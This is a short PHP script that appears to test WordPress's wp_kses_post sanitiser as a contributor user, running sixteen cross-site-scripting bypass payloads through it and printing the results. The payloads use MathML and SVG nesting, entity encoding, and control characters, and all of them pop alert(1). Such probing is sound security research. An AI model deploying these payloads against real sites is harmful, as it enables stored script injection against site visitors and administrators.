<?php
$contrib=get_user_by('login','contributor'); wp_set_current_user($contrib->ID);
kses_remove_filters(); kses_init_filters();
$payloads = array(
 'annotxml_html'=>'<math><annotation-xml encoding="text/html"><style></style><img src=x onerror=alert(1)></annotation-xml></math>',
 'annotxml_xhtml'=>'<math><annotation-xml encoding="application/xhtml+xml"><img src=x onerror=alert(1)></annotation-xml></math>',
 'svg_desc'=>'<svg><desc><img src=x onerror=alert(1)></desc></svg>',
 'svg_title'=>'<svg><title><img src=x onerror=alert(1)></title></svg>',
 'mi_html'=>'<math><mi><img src=x onerror=alert(1)></mi></math>',
 'ms_html'=>'<math><ms><table><img src=x onerror=alert(1)></ms></math>',
 'svg_script'=>'<svg><script>alert(1)</script></svg>',
 'svg_a_xlink'=>'<svg><a xlink:href="javascript:alert(1)"><text x=20 y=20>x</text></a></svg>',
 'ent_onerror'=>'<img src=x onerror="&#97;lert(1)">',
 'ent_hex'=>'<img src=x o&#110;error="alert(1)">',
 'ctrl_name'=>"<img src=x o\tnerror=alert(1)>",
 'nul_break'=>"<img src=x onerror\x00=alert(1)>",
 'svg_style_cdata'=>'<svg><style><![CDATA[]]><img src=x onerror=alert(1)></style></svg>',
 'mglyph_img'=>'<math><mtext><mglyph><img src=x onerror=alert(1)></mglyph></mtext></math>',
 'malformed_attr'=>'<img/src=x/onerror=alert(1)>',
 'unclosed_svg'=>'<svg><foreignobject><math><annotation-xml><svg><img src=x onerror=alert(1)>',
);
$k1=array(); foreach($payloads as $k=>$p){ $k1[$k]=wp_kses_post($p); }
echo json_encode($k1);
